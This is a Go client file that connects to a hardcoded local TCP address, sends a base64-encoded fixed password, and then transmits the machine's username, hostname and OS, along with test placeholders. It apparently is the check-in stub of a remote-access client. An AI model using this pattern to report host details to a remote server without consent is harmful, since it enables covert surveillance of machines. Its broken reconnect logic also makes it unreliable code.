package client

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strconv"
)

const (
	IP      = "127.0.0.1:1010"
	PORT    = 1010
	CONNPWD = "18Sd9fkdkf9"
)

const (
	HEAD    = "HEAD"
	VERSION = "1.0.0"
)

func Ma() {
	connect()
}

// 连接远程服务器
func connect() {
	//建立tcp连接

	conn, err := net.Dial("tcp", IP)
	//连接失败进行重连
	if err != nil {
		fmt.Println("Connection...")
		for {
			connect()

		}
	}
	errMsg := base64.URLEncoding.EncodeToString([]byte(CONNPWD))
	conn.Write([]byte(string(errMsg) + "\n"))
	//连接成功
	fmt.Println("Connection success...")
	maConnet()

}

func maConnet() {
	socket, err := net.Dial("tcp", "127.0.0.1:1010")
	if err != nil {
		panic(err)
	}
	defer socket.Close()

	socket.Write([]byte(HEAD))
	socket.Write([]byte(os.Getenv("USERNAME")))
	socket.Write([]byte(os.Getenv("HOSTNAME")))
	socket.Write([]byte(os.Getenv("OS")))
	socket.Write([]byte(IP))
	socket.Write([]byte("测试地址"))
	socket.Write([]byte("测试名字"))
	socket.Write([]byte(strconv.Itoa(1111)))
	socket.Write([]byte("测试"))
	socket.Write([]byte(VERSION))
	fmt.Println("aaaaaaaaaaaaaa")
	//IP := "127.0.0.1"
	//writer := bufio.NewWriter(socket)

	//binary.Write(writer, binary.LittleEndian, []byte(HEAD))
	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("USERNAME")))
	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("HOSTNAME")))
	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("OS")))
	//binary.Write(writer, binary.LittleEndian, []byte(IP))
	//binary.Write(writer, binary.LittleEndian, []byte("测试地址"))
	//binary.Write(writer, binary.LittleEndian, []byte("测试名字"))
	//binary.Write(writer, binary.LittleEndian, []byte(strconv.Itoa(1111)))
	//binary.Write(writer, binary.LittleEndian, []byte("测试"))
	//binary.Write(writer, binary.LittleEndian, []byte(VERSION))
	//writer.Flush()

}
